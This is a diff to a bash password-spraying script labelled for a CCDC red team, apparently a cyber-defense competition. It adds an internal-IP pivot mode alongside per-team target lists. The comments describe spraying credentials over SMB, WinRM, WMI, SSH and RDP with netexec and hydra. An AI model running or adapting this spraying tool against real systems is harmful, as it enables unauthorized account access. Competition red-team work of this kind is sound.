@@ -1,7 +1,7 @@
 #!/bin/bash
 # ================================================
 # CCDC Red Team Password Spray Script
-# Targets: 192.168.20<TEAM>.{140,10,11,70,71,141,72}
+# Targets: 192.168.20<TEAM>.* (external) or 172.16.*.* (internal via -x)
 # Uses: users.txt + passwords.txt (spray style = 1 pass → all users)
 # Protocols: SMB → WinRM → WMI (netexec) | SSH → RDP (hydra)
 # Pre-checks port availability, skips closed services
@@ -9,42 +9,59 @@
 #
 # Default: stop at first successful auth on any box/protocol/user
 # -a flag : continue spraying everything after hits (full coverage)
+# -x flag : use internal 172.16.x.x IPs (for proxychains pivot)
 # DA accounts are tried first before users.txt entries
 # ================================================
 
 set -euo pipefail
 
 usage() {
-  echo "Usage: $0 <team_number> [-a] [-u user1] [-u user2] ..."
+  echo "Usage: $0 <team_number> [-a] [-x] [-u user1] [-u user2] ..."
   echo "  -a        continue-on-success: keep spraying after first hit"
+  echo "  -x        use internal 172.16.x.x IPs (proxychains/pivot mode)"
   echo "  -u USER   add USER to the front of the spray list (repeatable)"
   exit 1
 }
 
 CONTINUE_ALL=0
+USE_INTERNAL=0
 EXTRA_USERS=()
 
 if [[ $# -lt 1 ]]; then usage; fi
 TEAM="$1"; shift
 
-while getopts "au:" opt; do
+while getopts "axu:" opt; do
   case "$opt" in
     a) CONTINUE_ALL=1 ;;
+    x) USE_INTERNAL=1 ;;
     u) EXTRA_USERS+=("$OPTARG") ;;
     *) usage ;;
   esac
 done
 
-BASE="192.168.20${TEAM}."
-IPS=(
-  "${BASE}140"  # curiosity
-  "${BASE}10"   # morality
-  "${BASE}11"   # intelligence
-  "${BASE}70"   # anger
-  "${BASE}71"   # fact
-  "${BASE}141"  # space
-  "${BASE}72"   # adventure
-)
+if [[ $USE_INTERNAL -eq 1 ]]; then
+  IPS=(
+    "172.16.3.140"  # curiosity
+    "172.16.1.10"   # morality
+    "172.16.1.11"   # intelligence
+    "172.16.2.70"   # anger
+    "172.16.2.71"   # fact
+    "172.16.3.141"  # space
+    "172.16.2.72"   # adventure
+  )
+  echo "[*] Mode: INTERNAL IPs (172.16.x.x — proxychains pivot)"
+else
+  BASE="192.168.20${TEAM}."
+  IPS=(
+    "${BASE}140"  # curiosity
+    "${BASE}10"   # morality
+    "${BASE}11"   # intelligence
+    "${BASE}70"   # anger
+    "${BASE}71"   # fact
+    "${BASE}141"  # space
+    "${BASE}72"   # adventure
+  )
+fi
 
 USERS_FILE="users.txt"
 PASSES="passwords.txt"
